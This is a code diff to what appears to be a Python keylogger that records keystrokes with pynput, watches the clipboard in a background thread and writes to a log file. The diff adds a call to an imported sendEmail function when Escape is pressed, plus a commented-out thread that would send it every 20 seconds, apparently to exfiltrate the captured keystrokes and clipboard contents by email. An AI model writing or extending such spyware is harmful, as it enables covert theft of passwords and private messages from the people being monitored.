@@ -5,15 +5,15 @@ from datetime import datetime
 from pynput import keyboard
 import pyperclip
 from threading import Thread
-
+from emailFunctionality import sendEmail
 
 log_file = "logs.txt"
 
 ThreadRunning = True
-
 def on_press(key):
     global ThreadRunning
     if key == keyboard.Key.esc:
+        sendEmail()
         print("escape")
         ThreadRunning = False
         return False  
@@ -49,12 +49,25 @@ def checkClipBoard():
         time.sleep(1)
     
 
+# def sendToEmail():
+
+#     while ThreadRunning:
+#         sendEmail()
+#         time.sleep(20)
+#     return
+
+
 if __name__ == "__main__":
     try: 
         listener = keyboard.Listener(on_press=on_press)
         checkClipBoardThread = threading.Thread(target=checkClipBoard)
         checkClipBoardThread.daemon = True
         checkClipBoardThread.start()
+
+        # sendEmailThread = threading.Thread(target=sendToEmail)
+        # sendEmailThread.daemon = True
+        # sendEmailThread.start()
+
         listener.start() 
         listener.join()  
     except KeyboardInterrupt:
